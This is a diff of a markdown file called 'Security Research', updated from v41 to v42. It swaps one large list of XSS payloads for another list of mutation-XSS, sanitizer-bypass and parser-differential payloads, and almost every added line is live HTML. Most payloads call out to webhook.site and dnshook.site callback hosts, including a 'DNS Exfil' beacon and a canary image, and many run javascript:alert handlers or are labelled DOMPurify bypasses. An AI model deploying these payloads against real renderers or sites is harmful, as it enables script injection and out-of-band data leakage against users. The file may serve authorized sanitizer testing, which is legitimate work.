@@ -1,248 +1,216 @@
-# Security Research - v41
+# Security Research - v42
 
-## Obscure Attack Vectors & Browser-Specific Behaviors
+## Mutation XSS (mXSS) & Parser Differentials
 
-Testing lesser-known XSS vectors, browser quirks, and edge cases.
-
----
-
-### 1) CSS Injection Attempts
-
-<style>body{background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/css-bg.gif')}</style>
-
-<div style="background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/inline-bg.gif')">CSS bg</div>
-
-<div style="behavior:url(script.htc)">IE behavior</div>
-
-<div style="-moz-binding:url('test.xml#xss')">Firefox binding</div>
-
-<div style="list-style-image:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/list-style.gif')">List style</div>
+Testing advanced mXSS techniques exploiting parser differences.
 
 ---
 
-### 2) Meta Tag Injection
+### 1) SVG Foreign Object mXSS
 
-<meta http-equiv="refresh" content="0;url=https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/meta-refresh">
+<svg><foreignobject><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo.gif">]]></foreignobject></svg>
 
-<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
-
-<meta name="referrer" content="unsafe-url">
-
-<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<svg><foreignobject><body><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo-body.gif"></body></foreignobject></svg>
 
 ---
 
-### 3) Link Tag Injection
+### 2) MathML Foreign mXSS
 
-<link rel="stylesheet" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/style.css">
+<math><mtext><table><mglyph><style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-mtext.gif">
 
-<link rel="icon" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/favicon.ico">
-
-<link rel="prefetch" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/prefetch.html">
-
-<link rel="dns-prefetch" href="//prefetch.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site">
-
-<link rel="preconnect" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c">
+<math><annotation-xml encoding="text/html"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-annotation.gif"></annotation-xml></math>
 
 ---
 
-### 4) Base Tag Hijacking
+### 3) Noscript Context Escape
 
-<base href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/">
+<noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-img.gif"></noscript>
 
-[relative link after base](test.gif)
+<noscript><link rel="stylesheet" href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-css.css"></noscript>
 
-![relative img after base](img.gif)
-
----
-
-### 5) Object/Embed/Applet
-
-<object data="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/object.swf"></object>
-
-<embed src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/embed.swf"></embed>
-
-<applet code="test" codebase="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/"></applet>
+<noscript></noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-noscript.gif">
 
 ---
 
-### 6) XML/XHTML Specific
+### 4) Title/Textarea Parser Bypass
 
-<xml id="test"><x><script>alert(1)</script></x></xml>
+<title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/title.gif"></title>
 
-<import implementation="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/test.html">
+<textarea><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/textarea.gif"></textarea>
 
-<?xml version="1.0"?><script>alert(1)</script>
-
----
-
-### 7) HTML5 Form Features
-
-<form action="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/form" method="GET">
-<input type="text" name="test" autofocus onfocus="alert(1)">
-<button formaction="javascript:alert(1)">Submit</button>
-</form>
-
-<input type="image" src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/input-img.gif">
-
-<button type="submit" formaction="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/button">Button</button>
+<title></title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-title.gif">
 
 ---
 
-### 8) Frameset/Frame
+### 5) NoEmbed/NoFrames Context
 
-<frameset><frame src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/frame.html"></frame></frameset>
+<noembed><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noembed.gif"></noembed>
 
-<frame src="javascript:alert(1)">
-
----
-
-### 9) Math ML Advanced
-
-<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click</maction></math>
-
-<math><annotation-xml encoding="application/xhtml+xml"><img src="x" onerror="alert(1)"></annotation-xml></math>
-
-<math xlink:href="javascript:alert(1)">Math XLink</math>
+<noframes><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noframes.gif"></noframes>
 
 ---
 
-### 10) Attribute Breakout
+### 6) Raw Text Elements Breakout
 
-<img src="test.gif" alt="" onload="alert(1)" ">
+<script><</script><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/script-break.gif">
 
-<a href="test" " onclick="alert(1)">Breakout link</a>
-
-<div title='test' onclick='alert(1)'>Div breakout</div>
-
-<img src=`https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/backtick.gif`>
+<style><</style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/style-break.gif">
 
 ---
 
-### 11) Unicode Tricks (Advanced)
+### 7) Table-Based mXSS
 
-<a href="javascript:alert(1)">Control char prefix</a>
+<table><tr><caption><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-caption.gif"></caption></tr></table>
 
-<a href="\u006aavascript:alert(1)">JSON escape</a>
+<table><colgroup><col><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-col.gif"></colgroup></table>
 
-<a href="&#1;javascript:alert(1)">Entity control char</a>
-
-<script\x00>alert(1)</script>
-
-<a href="jav​ascript:alert(1)">Zero-width space</a>
-
-<a href="jav ascript:alert(1)">NBSP in protocol</a>
+<table><tbody><math><mtext><h1><a href="javascript:alert(1)">mXSS</a></h1></mtext></math></tbody></table>
 
 ---
 
-### 12) Template/Slot Elements
+### 8) Select/Option mXSS
 
-<template><script>alert(1)</script></template>
+<select><option><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/select-option.gif"></option></select>
 
-<template><img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/template.gif"></template>
-
-<slot name="test"><script>alert(1)</script></slot>
+<select><option></option></select><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-select.gif">
 
 ---
 
-### 13) Shadow DOM Escape (HTML)
+### 9) DOMPurify Bypass Patterns
 
-<div><shadow><content><script>alert(1)</script></content></shadow></div>
+<form><math><mtext></form><form><mglyph><style></math><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/domclobber1.gif">
 
-<div><slot><script>alert(1)</script></slot></div>
-
----
-
-### 14) Custom Elements
-
-<custom-element onclick="alert(1)">Custom</custom-element>
-
-<x-xss onclick="alert(1)">X-XSS</x-xss>
-
-<script-x>alert(1)</script-x>
+<svg><animate href="#x" attributeName="href" values="javascript:alert(1)"></animate><a id="x"><text>Click</text></a></svg>
 
 ---
 
-### 15) Portal/Fenced Frame
+### 10) Namespace Confusion
 
-<portal src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/portal.html"></portal>
+<svg><p><style><g title="</style><img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ns-confusion.gif'>
 
-<fencedframe src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/fenced.html"></fencedframe>
-
----
-
-### 16) Deprecated/Obsolete Tags
-
-<bgsound src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/sound.wav">
-
-<listing><script>alert(1)</script></listing>
-
-<xmp><script>alert(1)</script></xmp>
-
-<plaintext><script>alert(1)</script>
-
-<blink onclick="alert(1)">Blink</blink>
-
-<spacer type="block" width="100" height="100">
+<svg><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-cdata.gif">]]></svg>
 
 ---
 
-### 17) Canvas XSS
+### 11) Comment-Based mXSS
 
-<canvas id="c" onclick="alert(1)"></canvas>
+<!--><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment1.gif">-->
 
-<canvas id="c"><script>alert(1)</script></canvas>
+<!--<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment2.gif">--!>
 
----
-
-### 18) Audio/Video Events
-
-<audio src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/audio.mp3" onloadstart="alert(1)">
-
-<video src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/video.mp4" onloadstart="alert(1)">
-
-<video poster="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/poster.gif"></video>
-
-<track src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/track.vtt" kind="subtitles">
+<comment><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment-tag.gif"></comment>
 
 ---
 
-### 19) Use XLink (SVG)
+### 12) Entity Decoding After Parse
 
-<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"></use></svg>
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Entity XSS</a>
 
-<svg><use href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/external.svg#test"></use></svg>
+<a href="&Tab;javascript&colon;alert(1)">Tab entity</a>
 
----
-
-### 20) HTML Imports (deprecated)
-
-<link rel="import" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/import.html">
+<a href="java&NewLine;script:alert(1)">Newline entity</a>
 
 ---
 
-### 21) Manifest
+### 13) UTF-7 BOM Injection
 
-<html manifest="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/cache.manifest">
+<a href="+ADw-script+AD4-alert(1)+ADw-/script+AD4-">UTF-7</a>
+
++ADw-img src=x onerror=alert(1)+AD4-
 
 ---
 
-### 22) ARIA Attributes
+### 14) Closing Tag Confusion
 
-<div role="button" aria-label="<script>alert(1)</script>" onclick="alert(1)">ARIA</div>
+<p/onclick="alert(1)">Click P</p>
 
-<img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/aria.gif" aria-describedby="<script>">
+<img/src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/slash-img.gif"/onerror="alert(1)">
+
+<input/onfocus="alert(1)" autofocus>
+
+---
+
+### 15) Nested Template Exploit
+
+<template><template><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/nested-template.gif"></template></template>
+
+<template id="t"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/template-id.gif"></template>
+
+---
+
+### 16) Ruby Tag Bypass
+
+<ruby><rb>test</rb><rp><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ruby.gif"></rp><rt></rt></ruby>
+
+---
+
+### 17) Object/Param mXSS
+
+<object><param name="movie" value="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/param.swf"></object>
+
+---
+
+### 18) Keygen Element (Legacy)
+
+<keygen name="test" onfocus="alert(1)" autofocus>
+
+---
+
+### 19) Menu/MenuItem (Legacy)
+
+<menu><menuitem onclick="alert(1)">Click</menuitem></menu>
+
+---
+
+### 20) Command Element (Legacy)
+
+<command onclick="alert(1)">Command</command>
+
+---
+
+### 21) ContentEditable XSS
+
+<div contenteditable="true" onblur="alert(1)">Edit me</div>
+
+<span contenteditable onkeydown="alert(1)">Type here</span>
+
+---
+
+### 22) Design Mode
+
+<iframe srcdoc="<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/srcdoc.gif'>"></iframe>
+
+---
+
+### 23) Picture Source mXSS
+
+<picture>
+  <source media="(min-width: 0px)" srcset="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-source.gif">
+  <img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-img.gif">
+</picture>
+
+---
+
+### 24) Object Data URI
+
+<object data="data:text/html,<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/object-data.gif'>"></object>
+
+---
+
+### 25) Processing Instruction
+
+<?xml-stylesheet href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/pi.css"?>
 
 ---
 
 ### DNS Exfil
 
-![DNS](https://v41-dns.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site/dns.gif)
+![DNS](https://v42-dns.d62bdb5c-7bf6-46b6-b997-4cb10a584777.dnshook.site/dns.gif)
 
 ### Canary
 
-![Canary](https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/v41-canary.gif)
+![Canary](https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/v42-canary.gif)
 
 ---
 
-*v41 - Obscure attack vectors*
+*v42 - Mutation XSS & parser differentials*
